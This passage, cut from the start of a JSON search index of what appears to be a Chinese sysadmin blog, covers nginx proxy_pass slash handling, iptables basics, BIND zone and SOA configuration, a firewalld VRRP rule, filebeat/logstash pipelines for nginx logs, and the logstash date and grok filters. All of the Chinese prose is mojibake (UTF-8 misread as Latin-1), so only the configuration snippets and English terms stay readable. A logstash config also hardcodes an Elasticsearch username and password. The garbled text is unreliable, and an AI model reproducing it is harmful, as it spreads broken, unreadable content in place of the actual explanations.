127.0.0.1:8888/uri/ # localhost/test06aaa ==\u003e 127.0.0.1:8888/uriaaa # localhost/test06/aaa ==\u003e 127.0.0.1:8888/uri/aaa } location /test07 { proxy_pass http://127.0.0.1:8888/uri/; # localhost/test07 ==\u003e 127.0.0.1:8888/uri/ # localhost/test07/ ==\u003e 127.0.0.1:8888/uri// # localhost/test07aaa ==\u003e 127.0.0.1:8888/uri/aaa # localhost/test07/aaa ==\u003e 127.0.0.1:8888/uri//aaa } location /test08/ { proxy_pass http://127.0.0.1:8888/uri; # localhost/test08/ ==\u003e 127.0.0.1:8888/uri # localhost/test08/aaa ==\u003e 127.0.0.1:8888/uriaaa # localhost/test08/aaa/ ==\u003e 127.0.0.1:8888/uriaaa/ } location /test09/ { proxy_pass http://127.0.0.1:8888/uri/; # localhost/test09/ ==\u003e 127.0.0.1:8888/uri/ # localhost/test09/aaa ==\u003e 127.0.0.1:8888/uri/aaa # localhost/test09/aaa/ ==\u003e 127.0.0.1:8888/uri/aaa/ } ","date":"2021-04-21 14:29","objectID":"/post/2326/:0:3","tags":["nginx"],"title":"nginxåå‘ä»£ç†åŠ æ–œæ å’Œä¸åŠ æ–œæ çš„é—®é¢˜","uri":"/post/2326/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å‚è€ƒæ–‡ç« : https://www.cnblogs.com/kevingrace/p/6265113.html https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html iptablesçš„åŸºæœ¬æ¦‚å¿µ ","date":"2021-04-20 14:24","objectID":"/post/2324/:0:0","tags":["iptables"],"title":"iptablesåŸºæœ¬ä»‹ç»(ä¸€)","uri":"/post/2324/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸€ã€é“¾: æ¯ä¸ªé“¾ä¸‹éƒ½ä¼šæœ‰å¾ˆå¤šè§„åˆ™,å½“ä¸€ä¸ªæ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªé“¾æ—¶ï¼Œiptableså°±ä¼šä»é“¾ä¸­ç¬¬ä¸€æ¡è§„åˆ™å¼€å§‹æ£€æŸ¥ï¼Œçœ‹è¯¥æ•°æ®åŒ…æ˜¯å¦æ»¡è¶³è§„åˆ™æ‰€å®šä¹‰çš„æ¡ä»¶ã€‚å¦‚æœæ»¡è¶³ï¼Œç³»ç»Ÿå°±ä¼šæ ¹æ® è¯¥æ¡è§„åˆ™æ‰€å®šä¹‰çš„æ–¹æ³•å¤„ç†è¯¥æ•°æ®åŒ…ï¼›å¦åˆ™iptableså°†ç»§ç»­æ£€æŸ¥ä¸‹ä¸€æ¡è§„åˆ™ï¼Œå¦‚æœè¯¥æ•°æ®åŒ…ä¸ç¬¦åˆé“¾ä¸­ä»»ä¸€æ¡è§„åˆ™ï¼Œiptableså°±ä¼šæ ¹æ®è¯¥é“¾é¢„å…ˆå®šä¹‰çš„é»˜è®¤ç­–ç•¥æ¥å¤„ç†æ•°æ®åŒ…ã€‚ PREROUTING: æ§åˆ¶åˆšä»ç½‘å¡åˆ°è¾¾å†…æ ¸æ—¶çš„æ•°æ®åŒ…ï¼Œå³ç»è¿‡è·¯ç”±è¡¨ä¹‹å‰(æµé‡è¿›æ¥çš„ç¬¬ä¸€ä¸ªç¯èŠ‚) INPUT: æ§åˆ¶é€šå‘æœ¬åœ°å¥—æ¥å­—(æœ¬åœ°è¿›ç¨‹)çš„æ•°æ®åŒ… FORWARD: æ§åˆ¶è½¬å‘åˆ°å…¶ä»–ä¸»æœºçš„æ•°æ®åŒ… OUTPUT: æ§åˆ¶æœ¬åœ°å¥—æ¥å­—(æœ¬åœ°è¿›ç¨‹)å‘å¾€å¤–éƒ¨çš„æ•°æ®åŒ… POSTROUTING: æ§åˆ¶æ‰€æœ‰å‘åˆ°ç½‘å¡å‰çš„æ•°æ®åŒ…ï¼Œå³ç»è¿‡è·¯ç”±è¡¨ä¹‹å(æµé‡å‡ºå»çš„æœ€åä¸€ä¸ªç¯èŠ‚) ","date":"2021-04-20 14:24","objectID":"/post/2324/:0:1","tags":["iptables"],"title":"iptablesåŸºæœ¬ä»‹ç»(ä¸€)","uri":"/post/2324/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äºŒã€è¡¨: ä¼˜å…ˆçº§raw\u003emangle\u003enat\u003efilter 31190-9qlptu8yskf.png filter: iptableså·¥å…·çš„é»˜è®¤è¡¨,ç”¨äºè¿‡æ»¤æ•°æ®åŒ…ã€‚ åŒ…å«INPUTã€FORWARDã€OUTPUTé“¾ nat: å¯ä»¥ä¿®æ”¹sipã€dipã€sportã€dportã€‚ åŒ…å«PREROUTINGã€INPUT(centos7åŒ…å«)ã€OUTPUTã€POSTROUTINGé“¾ mangle: ä¸èƒ½è¿‡æ»¤æ•°æ®åŒ…ä¹Ÿä¸èƒ½ä¿®æ”¹æ•°æ®åŒ…ã€‚å…è®¸çš„æ“ä½œæ˜¯ä¿®æ”¹TOSã€TTLã€MARK åŒ…å«æ‰€æœ‰é“¾ raw: å†³å®šæ•°æ®åŒ…æ˜¯å¦è¢«çŠ¶æ€è·Ÿè¸ªæœºåˆ¶å¤„ç† åŒ…å«PREROUTINGã€OUTPUTé“¾ security: æ­¤è¡¨ç”¨äºå¼ºåˆ¶è®¿é—®æ§åˆ¶(MAC)ç½‘ç»œè§„åˆ™ï¼Œä¾‹å¦‚ç”±SECMARKå’ŒCONNSECMARKç›®æ ‡å¯ç”¨çš„è§„åˆ™ã€‚ åŒ…å«INPUTã€FORWARDã€OUTPUTé“¾ ","date":"2021-04-20 14:24","objectID":"/post/2324/:0:2","tags":["iptables"],"title":"iptablesåŸºæœ¬ä»‹ç»(ä¸€)","uri":"/post/2324/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸‰ã€è§„åˆ™: è§„åˆ™å°±æ˜¯å¦‚æœæ•°æ®åŒ…æ»¡è¶³æŒ‡å®šæ¡ä»¶ï¼Œæ‰§è¡ŒæŸäº›æ“ä½œã€‚è§„åˆ™æ˜¯æœ‰é¡ºåºçš„ï¼Œå½“æŸä¸€æ¡è§„åˆ™åŒ¹é…æˆåŠŸåå°±ä¸ä¼šåŒ¹é…åé¢çš„è§„åˆ™ ","date":"2021-04-20 14:24","objectID":"/post/2324/:0:3","tags":["iptables"],"title":"iptablesåŸºæœ¬ä»‹ç»(ä¸€)","uri":"/post/2324/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å››ã€æ•°æ®åŒ…å¤„ç†æµç¨‹ 48851-gwmc7hqmx8f.png æ³¨æ„å¦‚æœæ•°æ®åŒ…å…ˆå’ŒæŸä¸ªè¡¨ä¸­çš„é“¾çš„è§„åˆ™åŒ¹é…æˆåŠŸï¼Œåˆ™ä¸ä¼šå’Œå…¶ä»–è¡¨åŒ¹é…äº†ã€‚ ","date":"2021-04-20 14:24","objectID":"/post/2324/:0:4","tags":["iptables"],"title":"iptablesåŸºæœ¬ä»‹ç»(ä¸€)","uri":"/post/2324/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1./etc/named.conf listen-on port 53 { localhost; }; allow-query { localhost;any; }; allow-transfer { 172.17.10.151; }; // é…ç½®åªå…è®¸172.17.10.151ï¼Œä½œä¸ºä»æœåŠ¡å™¨æ‹‰å–é…ç½® dnssec-enable no; dnssec-validation no; recursion yes; recursion no; //ä½¿ç”¨è¿­ä»£æŸ¥è¯¢å¤„ç†è¯·æ±‚,å½“å®¢æˆ·ç«¯è¯·æ±‚è§£ææ—¶,æœ¬åœ°æœ‰ç¼“å­˜æˆ–è€…æœ‰åŒºåŸŸè®°å½•åˆ™ä¼šè¿”å›å¯¹åº”çš„ä¿¡æ¯,å¦åˆ™è§£æå¤±è´¥ï¼Œå› ä¸ºæˆ‘ä»¬ä¸æ˜¯æ ¹åŸŸ,æ²¡æœ‰é¡¶çº§åŸŸçš„ä¿¡æ¯ï¼Œæ‰€ä»¥æ— æ³•å‘ŠçŸ¥å®¢æˆ·ç«¯å¯»æ‰¾å…¶ä»–æœåŠ¡å™¨ã€‚ 2.ä½¿ç”¨rndcå‘½ä»¤ç®¡ç†bind rndcä½¿ç”¨çš„æ˜¯953/tcpç«¯å£ rndcå‚æ•°: reload: é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶å’Œæ‰€æœ‰zone reload zonename: é‡æ–°åŠ è½½å•ä¸ªzone retransfer zonename: é‡æ–°ä¼ è¾“å•ä¸ªzoneï¼Œä¸æ£€æŸ¥åºåˆ—å· notify zonename: é‡æ–°å‘é€zoneçš„é€šçŸ¥æ¶ˆæ¯ reconfig: é‡æ–°åŠ è½½ä¸»é…ç½®æ–‡ä»¶ querylog [ on | off ]: å¯ç”¨/ç¦ç”¨æŸ¥è¯¢æ—¥å¿—è®°å½• trace: å°†è°ƒè¯•çº§åˆ«å¢åŠ 1 trace LEVEL: ä¿®æ”¹è°ƒè¯•çº§åˆ« notrace: ä¿®æ”¹è°ƒè¯•çº§åˆ«ä¸º0 flush: æ¸…ç©ºDNSæ‰€æœ‰ç¼“å­˜è®°å½• ","date":"2021-04-13 17:03","objectID":"/post/2317/:0:0","tags":["dns","bind"],"title":"dnsæœåŠ¡bindé…ç½®","uri":"/post/2317/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æ­£å‘è§£æ 1./etc/named.rfc1912.zones zone \"soulchild.com\" IN { type master; file \"soulchild.com.zone\"; allow-update { none; }; // ä¸å…è®¸å®¢æˆ·ç«¯æ³¨å†Œè¿™ä¸ªzoneè®°å½•ã€‚è®¾ç½®ä¸ºanyæˆ–å…¶ä»–ipè¡¨ç¤ºå…è®¸ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡nsupdateåŠ¨æ€æ›´æ–°è§£æè®°å½•ã€‚ }; 2./var/named/soulchild.com.zone $TTL 3H @ IN SOA @ 742899387.qq.com. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @ A 172.17.0.150 websrv A 1.1.1.1 websrv A 2.2.2.2 websrv A 3.3.3.3 www 1 CNAME websrv @ MX 10 mail1 mail1 A 4.4.4.4 $GENERATE 1-100 web$ A 10.0.0.$ ; ç”Ÿæˆ1-100çš„æ•°å­—,web1å¯¹åº”10.0.0.1, web2å¯¹åº”10.0.0.2 ","date":"2021-04-13 17:03","objectID":"/post/2317/:0:1","tags":["dns","bind"],"title":"dnsæœåŠ¡bindé…ç½®","uri":"/post/2317/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åå‘è§£æ 1./etc/named.rfc1912.zones zone \"0.17.172.in-addr.arpa\" IN { type master; file \"172.17.10.zone\"; allow-update { none; }; }; 2./var/named/172.17.0.zone $TTL 1D @ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @ A 127.0.0.1 150 PTR soulchild.com. é‡æ–°åŠ è½½rndc reload æµ‹è¯•:dig -x 172.17.0.150 @172.17.10.150 ","date":"2021-04-13 17:03","objectID":"/post/2317/:0:2","tags":["dns","bind"],"title":"dnsæœåŠ¡bindé…ç½®","uri":"/post/2317/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/starxu85/article/details/3357652 Bindçš„SOAè®°å½•ï¼šæ¯ä¸ªZoneä»…æœ‰ä¸€ä¸ªSOAè®°å½•ã€‚SOAè®°å½•åŒ…æ‹¬Zoneçš„åå­—ï¼Œä¸€ä¸ªæŠ€æœ¯è”ç³»äººå’Œå„ç§ä¸åŒçš„è¶…æ—¶å€¼ã€‚ ä¾‹å­ï¼š $ORIGIN . $TTL 3600Â ; 1 hour 10235.comÂ IN SOAÂ ns1.abc.com.Â root.ns1.abc.com. ( 2007061402 ; serial 3600Â ; refresh (1 hour) 900Â ; retry (15 minutes) 1209600Â ; expire (2 weeks) 3600Â ; minimum (1 hour) ) ","date":"2021-04-13 16:05","objectID":"/post/2314/:0:0","tags":["dns","bind"],"title":"bind SOAé…ç½®è¯´æ˜","uri":"/post/2314/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ç¬¬ä¸‰è¡Œ 10235.comï¼šä»£è¡¨å½“å‰åŸŸï¼Œå¯ä»¥ç”¨@ä»£æ›¿ ns1.abc.com.ï¼šæŒ‡å®šå½“å‰åŸŸçš„ä¸»DNS SERVER root.ns1.abc.com.ï¼šç®¡ç†å‘˜é‚®ç®±(@ä½¿ç”¨.ä»£æ›¿),ç­‰åŒäºroot@ns1.abc.com. ###SerialÂ æ•°å€¼Serialä»£è¡¨è¿™ä¸ªZoneçš„åºåˆ—å·ã€‚ä¾›Slave DNSåˆ¤æ–­æ˜¯å¦ä»Master DNSè·å–æ–°æ•°æ®ã€‚æ¯æ¬¡Zoneæ–‡ä»¶æ›´æ–°ï¼Œéƒ½éœ€è¦ä¿®æ”¹Serialæ•°å€¼ã€‚RFC1912 2.2å»ºè®®çš„æ ¼å¼ä¸ºYYYYMMDDnn å…¶ä¸­nnä¸ºä¿®è®¢å·; ###Refresh æ•°å€¼Refreshè®¾ç½®Slave DNSå¤šé•¿æ—¶é—´ä¸Master Serverè¿›è¡ŒSerialæ ¸å¯¹ã€‚ç›®å‰Bindçš„notifyå‚æ•°å¯è®¾ç½®æ¯æ¬¡Master DNSæ›´æ–°éƒ½ä¼šä¸»åŠ¨é€šçŸ¥Slave DNSæ›´æ–°ï¼ŒRefreshå‚æ•°ä¸»è¦ç”¨äºnotifyå‚æ•°å…³é—­æ—¶; ###Retry æ•°å€¼Retryè®¾ç½®å½“Slave DNSè¯•å›¾è·å–Master DNS Serialæ—¶ï¼Œå¦‚æœMaster DNSæœªå“åº”ï¼Œå¤šé•¿æ—¶é—´é‡æ–°è¿›è¡Œæ£€æŸ¥; ###Expire æ•°å€¼Expireå°†å†³å®šSlave DNSåœ¨æ²¡æœ‰Master DNSçš„æƒ…å†µä¸‹æƒå¨åœ°æä¾›åŸŸåè§£ææœåŠ¡çš„æ—¶é—´é•¿çŸ­; ###Minimum å¦å®šç­”æ¡ˆçš„TTL,å½“æœåŠ¡å™¨æ²¡æœ‰è§£æåˆ°åŸŸåæ—¶ï¼Œè®¾ç½®å®¢æˆ·ç«¯ç¼“å­˜æ—¶é—´ åœ¨8.2ç‰ˆæœ¬ä¹‹å‰ï¼Œç”±äºæ²¡æœ‰ç‹¬ç«‹çš„ $TTL æŒ‡ä»¤ï¼Œæ‰€ä»¥é€šè¿‡ SOA æœ€åä¸€ä¸ªå­—æ®µæ¥å®ç°ã€‚ä½†ç”±äº BIND 8.2 åå‡ºç°äº† $TTLÂ æŒ‡ä»¤ï¼Œè¯¥éƒ¨åˆ†åŠŸèƒ½å°±ä¸å†ç”± SOA çš„æœ€åä¸€ä¸ªå­—æ®µæ¥è´Ÿè´£ï¼Œç”± $TTL å…¨æƒè´Ÿè´£ ","date":"2021-04-13 16:05","objectID":"/post/2314/:0:1","tags":["dns","bind"],"title":"bind SOAé…ç½®è¯´æ˜","uri":"/post/2314/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth1 --destination 224.0.0.18 --protocol vrrp -j ACCEPT ","date":"2021-04-09 17:20","objectID":"/post/2312/:0:0","tags":[],"title":"firewalldå¼€æ”¾vrrpåè®®","uri":"/post/2312/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€ã€nginxæ—¥å¿—æ”¹é€  å®šä¹‰jsonæ—¥å¿—æ ¼å¼ log_format json '{ \"@timestamp\": \"$time_iso8601\", ' '\"remote_addr\": \"$remote_addr\", ' '\"remote_user\": \"$remote_user\", ' '\"body_bytes_sent\": \"$body_bytes_sent\", ' '\"request_time\": \"$request_time\", ' '\"status\": \"$status\", ' '\"request_host\": \"$host\", ' '\"request_method\": \"$request_method\", ' '\"request_uri\": \"$request_uri\", ' '\"uri\": \"$uri\", ' '\"http_referrer\": \"$http_referer\", ' '\"body_bytes_sent\":\"$body_bytes_sent\", ' '\"http_x_forwarded_for\": \"$http_x_forwarded_for\", ' '\"http_user_agent\": \"$http_user_agent\" ' '}'; 2.æ›¿æ¢mainä¸ºjsonæ ¼å¼ cd /usr/local/nginx/conf/conf.d/;ls | xargs -l sed -i 's#main;#json;# ","date":"2021-04-08 17:13","objectID":"/post/2309/:0:1","tags":["nginx","elk"],"title":"filebeat+logstashæ”¶é›†nginxæ—¥å¿—","uri":"/post/2309/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"äºŒã€é…ç½®filebeat filebeat.inputs: - type: log paths: - /usr/local/nginx/logs/*_access.log fields_under_root: true fields: log_type: nginx_access env: test json: keys_under_root: true overwrite_keys: true - type: log paths: - /usr/local/nginx/logs/*_error.log fields_under_root: true fields: log_type: nginx_error env: test processors: - add_host_metadata: netinfo.enabled: true - drop_fields: fields: - input - agent - ecs - beat - prospector - name - host.architecture - host.os - host.id - host.containerized - host.mac - host.name output.redis: hosts: [\"1.1.1.1\"] datatype: \"list\" db: 0 key: \"nginx_test\" ","date":"2021-04-08 17:13","objectID":"/post/2309/:0:2","tags":["nginx","elk"],"title":"filebeat+logstashæ”¶é›†nginxæ—¥å¿—","uri":"/post/2309/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‰ã€é…ç½®logstash 1.input-from-redis.config input { redis { data_type =\u003e \"list\" db =\u003e 0 host =\u003e \"1.1.1.1\" key =\u003e \"nginx_test\" } } 2.filter.config filter { mutate { add_field =\u003e { \"handler\" =\u003e \"${HOSTNAME:logstash-01}\" } } } 3.output-into-es.config output{ if [log_type] == \"blade_java\" or [log_type] == \"springboot_java\" { elasticsearch { hosts =\u003e [\"2.2.2.1:9200\", \"2.2.2.2:9200\", \"2.2.2.3:9200\"] index =\u003e \"%{project}-%{env}-%{app}-%{+yyyy.MM.dd}\" user =\u003e \"log_agent\" password =\u003e \"loados-log\" } } if [log_type] in [\"nginx_access\", \"nginx_error\"] { elasticsearch { hosts =\u003e [\"2.2.2.1:9200\", \"2.2.2.2:9200\", \"2.2.2.3:9200\"] index =\u003e \"%{log_type}-%{env}-%{+yyyy.MM.dd}\" user =\u003e \"log_agent\" password =\u003e \"loados-log\" } } } ","date":"2021-04-08 17:13","objectID":"/post/2309/:0:3","tags":["nginx","elk"],"title":"filebeat+logstashæ”¶é›†nginxæ—¥å¿—","uri":"/post/2309/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"dateè¿‡æ»¤å™¨ç”¨äºè§£æå­—æ®µä¸­çš„æ—¥æœŸï¼Œç„¶åä½¿ç”¨è¯¥æ—¥æœŸæˆ–æ—¶é—´æˆ³ä½œä¸ºæ—¥å¿—å­˜å‚¨æ—¶é—´(@timestamp).ä¹Ÿå¯ä»¥é€šè¿‡targeté€‰é¡¹è‡ªå®šä¹‰ ä¾‹å¦‚syslogçš„æ—¶é—´æ ¼å¼:Apr 17 09:32:01,å¯ä»¥ä½¿ç”¨MMM dd HH:mm:ssæ¥è§£æ ","date":"2021-04-01 17:29","objectID":"/post/2300/:0:0","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ç¤ºä¾‹: å°†æŒ‰ç…§æŒ‡å®šçš„æ ¼å¼ï¼Œè§£æäº‹ä»¶ä¸­dateå­—æ®µã€‚å°†è§£æå‡ºæ¥çš„å†…å®¹æ›¿æ¢åˆ°@timestamp filter { date { # æ—¶é—´ï¼š2021-04-01 15:29:43.607 match =\u003e [ \"date\", \"yyyy-MM-dd HH:mm:ss.SSS\" ] } } ","date":"2021-04-01 17:29","objectID":"/post/2300/:1:0","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"æ—¥æœŸè¯­æ³•ç®€ä»‹ å®Œæ•´: https://www.elastic.co/guide/en/logstash/7.8/plugins-filters-date.html: ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:0","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"å¹´ yyyy: å®Œæ•´çš„å¹´ä»½ï¼Œä¾‹å¦‚2015 yy: ä¸¤ä½æ•°çš„å¹´ä»½. ä¾‹å¦‚: 2015å¹´çš„15 ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:1","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"æœˆ M: ä¸€ä½æ•°çš„æœˆã€‚ä¾‹å¦‚: 1è¡¨ç¤º1æœˆ,12è¡¨ç¤º12æœˆ MM: ä¸¤ä½æ•°çš„æœˆä»½ã€‚ä¾‹å¦‚: 01è¡¨ç¤º1æœˆ,12è¡¨ç¤º12æœˆ MMM: ç®€å†™è‹±æ–‡ã€‚ä¾‹å¦‚: Janè¡¨ç¤º1æœˆ,Decè¡¨ç¤º12æœˆ. æ³¨æ„:ä½¿ç”¨çš„è¯­è¨€å–å†³äºæ‚¨çš„åœ°åŒºã€‚localeé…ç½® MMMM: å®Œæ•´è‹±æ–‡ã€‚ä¾‹å¦‚: Januaryè¡¨ç¤º1æœˆ. æ³¨æ„:ä½¿ç”¨çš„è¯­è¨€å–å†³äºæ‚¨çš„åœ°åŒºã€‚localeé…ç½® ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:2","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"æ—¥ d: ä¸€ä½æ•°çš„æ—¥ã€‚ä¾‹å¦‚: 3å· dd: ä¸¤ä½æ•°çš„æ—¥ã€‚ä¾‹å¦‚: 03å· ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:3","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"æ—¶ H: ä¸€ä½æ•°çš„å°æ—¶ã€‚ä¾‹å¦‚: 1ç‚¹ HH: ä¸¤ä½æ•°çš„å°æ—¶ã€‚ä¾‹å¦‚: 01ç‚¹ ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:4","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"åˆ† m: ä¸€ä½æ•°çš„åˆ†ã€‚ä¾‹å¦‚: 6åˆ† mm: ä¸¤ä½æ•°çš„åˆ†ã€‚ä¾‹å¦‚: 06åˆ† ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:5","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ç§’ s: ä¸€ä½æ•°çš„ç§’ ss: ä¸¤ä½æ•°çš„ç§’ ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:6","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"æ›´å¤§ç²¾åº¦çš„ç§’ S: ååˆ†ä¹‹ä¸€ç§’ SS: ç™¾åˆ†ä¹‹ä¸€ç§’ SSS: åƒåˆ†ä¹‹ä¸€ç§’ ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:7","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"æ—¶åŒºåç§»é‡æˆ–æ ‡è¯† Z: æ ¼å¼HHmm,ä¾‹å¦‚-0700ã€‚å‡7å°æ—¶ ZZ: æ ¼å¼HH:mm,ä¾‹å¦‚-07:00ã€‚å‡7å°æ—¶ ZZZ: ä¾‹å¦‚Asia/Shanghai ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:8","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹dateç®€å•ä»‹ç»(äº”)","uri":"/post/2300/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"grokæ’ä»¶å¯ä»¥ä½¿ç”¨æ­£åˆ™å°†éç»“æ„åŒ–çš„æ—¥å¿—ï¼Œè§£ææˆç»“æ„åŒ–æ—¥å¿—ã€‚å¹¶ä¸”è¿˜å¯ä»¥ä½¿ç”¨å†…éƒ¨é¢„å®šä¹‰çš„æ­£åˆ™ã€‚ é¢„å®šä¹‰çš„æ­£åˆ™: https://github.com/logstash-plugins/logstash-patterns-core/tree/master/patterns åœ¨çº¿è°ƒè¯•å·¥å…·: https://grokdebug.herokuapp.com/ ","date":"2021-03-31 16:15","objectID":"/post/2299/:0:0","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€ã€åŸºæœ¬ä½¿ç”¨ ","date":"2021-03-31 16:15","objectID":"/post/2299/:1:0","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"1.ä½¿ç”¨å†…ç½®æ­£åˆ™æ ¼å¼: %{NUMBER:duration} %{IP:client} NUMBERä»£è¡¨æ­£åˆ™,durationä»£è¡¨æ­£åˆ™è§£æå‡ºæ¥å†…å®¹ï¼Œä½¿ç”¨çš„å­—æ®µåç§° ","date":"2021-03-31 16:15","objectID":"/post/2299/:1:1","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸¾ä¾‹: æ—¥å¿—å†…ç½®æ­£åˆ™æ ¼å¼55.3.244.1 GET /index.html 15824 0.043 logstashé…ç½® input { file { path =\u003e \"/var/log/http.log\" } } filter { grok { # å¯¹messageå­—æ®µè¿›è¡ŒåŒ¹é… match =\u003e { \"message\" =\u003e \"%{IP:client} %{WORD:method} %{URIPATHPARAM:request} %{NUMBER:bytes} %{NUMBER:duration}\" } } } ç»è¿‡grokè¿‡æ»¤åï¼Œäº‹ä»¶ä¼šæ·»åŠ å¦‚ä¸‹å­—æ®µ client: 55.3.244.1 method: GET request: /index.html bytes: 15824 duration: 0.043 ","date":"2021-03-31 16:15","objectID":"/post/2299/:1:2","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"2.ä½¿ç”¨è‡ªå®šä¹‰æ­£åˆ™æ ¼å¼ (?\u003cfield_name\u003ethe pattern here) field_nameä»£è¡¨æ­£åˆ™è§£æå‡ºæ¥å†…å®¹ï¼Œä½¿ç”¨çš„å­—æ®µåç§°ï¼Œthe pattern hereä»£è¡¨æ­£åˆ™è¡¨è¾¾å¼ ä¾‹å¦‚: (?\u003cbytes\u003e[0-9]+) ","date":"2021-03-31 16:15","objectID":"/post/2299/:1:3","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"äºŒã€é…ç½®é€‰é¡¹ ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:0","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"keep_empty_captures ç±»å‹: boolean é»˜è®¤å€¼: false æè¿°: å¦‚æœæ•è·çš„å€¼æ˜¯ç©ºå€¼ï¼Œæ˜¯å¦ä¿ç•™å­—æ®µï¼Œä¾‹å¦‚ æ­£åˆ™: \\|IP=(?\u003cclientip\u003e.*)\\|,è¿™ä¸ªæ­£åˆ™å¯èƒ½ä¼šåŒ¹é…åˆ°ç©ºçš„å†…å®¹ æ—¥å¿—å†…å®¹: |IP=|,è¿™ä¸ªå†…å®¹ä¼šè¢«ä¸Šé¢çš„æ­£åˆ™æˆåŠŸåŒ¹é…ï¼Œä½†æ˜¯åŒ¹é…çš„å†…å®¹æ˜¯ç©ºçš„ï¼Œé»˜è®¤æƒ…å†µä¸‹äº‹ä»¶ä¸­ä¸ä¼šæœ‰clientipå­—æ®µï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå¦‚æœè¦ä¿ç•™clientipå­—æ®µï¼Œéœ€è¦å°†å‚æ•°çš„å€¼æ”¹ä¸ºtrue ç»“æœ: { \"@timestamp\" =\u003e 2021-04-01T01:59:39.908Z, \"message\" =\u003e \"|IP=|\", \"host\" =\u003e 